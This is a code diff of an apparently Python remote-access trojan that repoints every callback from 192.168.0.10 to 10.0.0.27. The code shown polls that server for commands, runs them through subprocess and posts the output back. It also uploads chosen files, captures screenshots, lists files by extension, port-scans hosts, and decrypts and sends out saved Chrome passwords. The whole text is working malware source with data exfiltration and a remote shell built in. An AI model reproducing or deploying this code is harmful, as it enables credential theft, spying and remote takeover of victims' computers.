@@ -34,22 +34,22 @@ def subprocess_args(include_stdout=True):
 
 def changeDirectory(directory):
     os.chdir(directory)
-    requests.post(url = 'http://192.168.0.10',data = ('[+] CWD is ' + os.getcwd()))
+    requests.post(url = 'http://10.0.0.27',data = ('[+] CWD is ' + os.getcwd()))
 
 def grabfile(path):
     if os.path.exists(path):
         rpath = os.path.realpath(path)
-        url = 'http://192.168.0.10/store'
+        url = 'http://10.0.0.27/store'
         files = {'file': open(path, 'rb'),'path': rpath}
         r = requests.post(url, files=files)
     else:
-        post_response = requests.post(url='http://192.168.0.10',data='[-] Not able to find the file.')
+        post_response = requests.post(url='http://10.0.0.27',data='[-] Not able to find the file.')
 
 def takescreenshot():
     dirpath = tempfile.mkdtemp()
     path = dirpath + '\img.jpg'
     imagegrab.grab().save(path, "JPEG")
-    url = 'http://192.168.0.10/store'
+    url = 'http://10.0.0.27/store'
     files = {'file': open(path, 'rb'),'path': 'screencap.jpg'}
     r = requests.post(url, files=files)
     files['file'].close()
@@ -61,7 +61,7 @@ def search(path,ext):
         for file in files:
             if file.endswith(ext):
                 list = list + '\n' + os.path.join(dirpath,file)
-    requests.post(url='http://192.168.0.10',data=list)
+    requests.post(url='http://10.0.0.27',data=list)
 
 def scanner(ip,ports):
     scan_result = ''
@@ -77,7 +77,7 @@ def scanner(ip,ports):
             sock.close()
         except Exception as e:
             pass
-    requests.post(url='http://192.168.0.10',data=scan_result)
+    requests.post(url='http://10.0.0.27',data=scan_result)
 
 def chromedump():
     path = getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Login Data"
@@ -90,16 +90,16 @@ def chromedump():
 
         for raw in cursor.fetchall():
             password = win32crypt.CryptUnprotectData(raw[2])[1]
-            requests.post(url='http://192.168.0.10',data=(raw[0] + '\n' + raw[1]) + '\n' + password.decode())
+            requests.post(url='http://10.0.0.27',data=(raw[0] + '\n' + raw[1]) + '\n' + password.decode())
 
         conn.close()
         os.remove(path2)
     except Exception as e:
-        requests.post(url='http://192.168.0.10',data=str(e))
+        requests.post(url='http://10.0.0.27',data=str(e))
     
 def connect():
     while True:
-        req = requests.get('http://192.168.0.10')
+        req = requests.get('http://10.0.0.27')
         command = req.text
 
         if "terminate" in command:
@@ -125,8 +125,8 @@ def connect():
             chromedump()
         else:
             CMD = subprocess.Popen(command,**subprocess_args(True))
-            post_response = requests.post(url='http://192.168.0.10', data=CMD.stdout.read())
-            post_response = requests.post(url='http://192.168.0.10', data=CMD.stderr.read())
+            post_response = requests.post(url='http://10.0.0.27', data=CMD.stdout.read())
+            post_response = requests.post(url='http://10.0.0.27', data=CMD.stderr.read())
 
         time.sleep(3)
 
